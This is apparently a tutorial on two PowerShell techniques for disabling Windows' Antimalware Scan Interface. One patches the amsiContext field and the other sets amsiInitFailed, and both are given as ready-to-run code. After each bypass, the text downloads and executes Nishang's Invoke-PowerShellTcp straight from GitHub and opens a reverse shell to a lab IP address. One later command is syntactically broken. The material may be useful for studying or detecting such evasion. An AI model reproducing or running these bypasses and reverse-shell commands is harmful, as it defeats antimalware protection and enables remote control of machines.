## Bypass #1

The first bypass consists in modifying one field of the `System.Management.Automation.AmsiUtils` class, is an internal .NET class within PowerShell that interacts with the Antimalware Scan Interface (AMSI). The field we're interested specifically in is the `amsiContext` field.

To bypass AMSI, execute the following code within the powershell process:
- Create variable field
```powershell
$fields=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static')
```
- Uses the reflection feature of powershell. Reflection is when a process is able to inspect it's own memory. 

- Create AMSI context
```powershell
$amsiContext=$fields | Where-Object { $_ -like "*Context" }
```

- Create a pointer to the context
```powershell
[IntPtr]$amsiContextPointer=$amsiContext.GetValue($null)
```

- Create an empty buffer
```powershell
[Int32[]]$emptyBuffer = @(0);
```

- Overwrite the context with the empty buffer
```powershell
[System.Runtime.InteropServices.Marshal]::Copy($emptyBuffer, 0, $amsiContextPointer, 1)
```

Now, execute it again
```powershell
iex (iwr "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" -UseBasicParsing).Content
```

Notice that now, no error appears. You can then start a reverse shell.
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.122.1 -Port 4321
```

## Bypass #2

The second method consist in setting the `amsiInitFailed` field to `true` within the `AmsiUtils` class.

```powershell
$amsiInitFailedField=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetFields('NonPublic,Static') | Where-Object { $_.Name -like "amsiInitFailed" }
```

```powershell
$amsiInitFailedField.SetValue($null, $true)
```

```powershell 
iex (iwr "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" -UseBasicParsing).Content
```

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 192.168.122.1 -Port 4321
```

What if we save the file on disk and not in memory?:
```powershell
iex (iwr "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" -Outfile test.ps1
```
- This would trigger an event in the system, so the anti-virus will detect it. It's not called by AMSI, it's called by the `you wrote to a file` event.

Malware regularly uses packing to hide itself. Packing is when you hive the malicious code inside another program.
